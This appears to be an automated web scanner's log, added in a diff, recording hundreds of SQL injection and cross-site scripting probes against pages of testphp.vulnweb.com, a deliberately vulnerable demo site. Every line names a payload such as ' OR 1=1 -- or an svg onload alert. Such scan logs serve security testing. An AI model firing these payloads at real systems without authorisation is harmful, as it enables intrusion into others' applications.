+[2025-06-11 23:18:01] SQLi at http://testphp.vulnweb.com using payload: ' OR 1=1 --
+[2025-06-11 23:18:02] XSS at http://testphp.vulnweb.com/cart.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:02] SQLi at http://testphp.vulnweb.com using payload: " OR "1"="1
+[2025-06-11 23:18:02] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:02] XSS at http://testphp.vulnweb.com/cart.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:02] SQLi at http://testphp.vulnweb.com using payload: admin' --
+[2025-06-11 23:18:02] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:03] XSS at http://testphp.vulnweb.com/cart.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:03] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:03] SQLi at http://testphp.vulnweb.com/cart.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:03] XSS at http://testphp.vulnweb.com/index.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:04] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:04] SQLi at http://testphp.vulnweb.com/cart.php using payload: " OR "1"="1
+[2025-06-11 23:18:04] XSS at http://testphp.vulnweb.com/index.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:04] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:04] SQLi at http://testphp.vulnweb.com/cart.php using payload: admin' --
+[2025-06-11 23:18:04] XSS at http://testphp.vulnweb.com/index.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:05] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:05] SQLi at http://testphp.vulnweb.com/index.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:05] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:05] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:05] SQLi at http://testphp.vulnweb.com/index.php using payload: " OR "1"="1
+[2025-06-11 23:18:06] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:06] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:06] SQLi at http://testphp.vulnweb.com/index.php using payload: admin' --
+[2025-06-11 23:18:06] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:06] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:07] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:07] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:07] XSS at http://testphp.vulnweb.com/categories.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:07] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:07] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:07] XSS at http://testphp.vulnweb.com/categories.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:08] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:08] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:08] XSS at http://testphp.vulnweb.com/categories.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:08] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:09] SQLi at http://testphp.vulnweb.com/categories.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:09] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:09] SQLi at http://testphp.vulnweb.com/categories.php using payload: " OR "1"="1
+[2025-06-11 23:18:09] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:10] SQLi at http://testphp.vulnweb.com/categories.php using payload: admin' --
+[2025-06-11 23:18:10] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:11] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:11] XSS at http://testphp.vulnweb.com/artists.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:11] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:11] XSS at http://testphp.vulnweb.com/artists.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:11] XSS at http://testphp.vulnweb.com/login.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:12] XSS at http://testphp.vulnweb.com/artists.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:12] XSS at http://testphp.vulnweb.com/login.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:12] SQLi at http://testphp.vulnweb.com/artists.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:12] XSS at http://testphp.vulnweb.com/login.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:13] SQLi at http://testphp.vulnweb.com/artists.php using payload: " OR "1"="1
+[2025-06-11 23:18:13] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:13] SQLi at http://testphp.vulnweb.com/artists.php using payload: admin' --
+[2025-06-11 23:18:14] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:14] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:14] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:15] XSS at http://testphp.vulnweb.com/login.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:15] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:15] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:15] XSS at http://testphp.vulnweb.com/login.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:15] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:15] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:16] XSS at http://testphp.vulnweb.com/login.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:16] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:16] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:16] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:16] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: " OR "1"="1
+[2025-06-11 23:18:17] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: admin' --
+[2025-06-11 23:18:17] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:17] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:17] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:18] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:18] XSS at http://testphp.vulnweb.com/cart.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:18] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:18] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:18] XSS at http://testphp.vulnweb.com/cart.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:19] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:19] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:19] XSS at http://testphp.vulnweb.com/cart.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:19] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:19] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:20] SQLi at http://testphp.vulnweb.com/cart.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:20] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:20] SQLi at http://testphp.vulnweb.com/cart.php using payload: " OR "1"="1
+[2025-06-11 23:18:20] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:20] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:21] SQLi at http://testphp.vulnweb.com/cart.php using payload: admin' --
+[2025-06-11 23:18:21] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:21] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:21] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:22] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:22] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:22] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:22] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:22] SQLi at http://testphp.vulnweb.com/signup.php using payload: " OR "1"="1
+[2025-06-11 23:18:22] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:23] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:23] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:23] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:23] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:23] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:24] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:24] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:25] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:25] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:25] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:25] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:26] SQLi at http://testphp.vulnweb.com/signup.php using payload: " OR "1"="1
+[2025-06-11 23:18:26] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:26] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:26] XSS at http://testphp.vulnweb.com/userinfo.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:26] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:27] XSS at http://testphp.vulnweb.com/userinfo.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:27] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:18:27] XSS at http://testphp.vulnweb.com/userinfo.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:27] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:18:28] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:28] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:29] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:30] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:30] XSS at http://testphp.vulnweb.com/userinfo.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:30] XSS at http://testphp.vulnweb.com/userinfo.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:30] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:31] XSS at http://testphp.vulnweb.com/userinfo.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:31] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:31] XSS at http://testphp.vulnweb.com/login.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:31] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:32] XSS at http://testphp.vulnweb.com/login.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:32] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:32] XSS at http://testphp.vulnweb.com/login.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:32] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:32] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:33] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:33] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:33] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:33] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:33] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:34] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:35] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:35] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:18:35] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:18:36] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:36] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:36] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:36] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:37] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:37] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:37] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:37] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:37] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:37] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:38] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:38] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:38] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:38] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:38] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:39] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:39] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:39] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:39] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:40] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:40] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:40] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:41] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:41] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:41] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:41] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:41] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:42] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:42] SQLi at http://testphp.vulnweb.com/signup.php using payload: " OR "1"="1
+[2025-06-11 23:18:42] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:42] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:42] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:18:43] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:43] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:18:44] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:18:44] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:45] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:45] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:18:45] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:45] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:18:46] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:46] XSS at http://testphp.vulnweb.com/userinfo.php using payload: <script>alert(1)</script>
+[2025-06-11 23:18:46] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:46] XSS at http://testphp.vulnweb.com/userinfo.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:47] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:18:47] XSS at http://testphp.vulnweb.com/userinfo.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:47] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:18:47] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:48] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:48] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:48] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:18:49] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:49] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:49] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:18:49] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:49] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:50] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:50] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:18:50] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:18:50] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:18:51] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:18:51] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:18:52] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:18:52] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:52] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:52] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:18:52] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:52] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:53] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:18:53] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:53] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:53] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:54] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:18:54] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:54] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:18:54] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:55] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:18:55] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:18:55] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:56] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:18:56] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:18:56] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:56] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:18:56] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:57] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:57] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:57] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:18:57] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:18:58] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:18:58] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:18:58] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: admin' --
+[2025-06-11 23:18:59] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:18:59] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:18:59] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:00] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:19:00] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:00] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:19:00] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:01] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:01] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:01] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:01] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:19:02] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:02] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:19:02] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:19:03] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:03] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:19:03] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:19:03] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:03] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:19:04] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:19:04] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:04] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:19:04] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:05] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:19:05] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:05] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:19:05] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:19:06] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:06] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:07] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:07] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
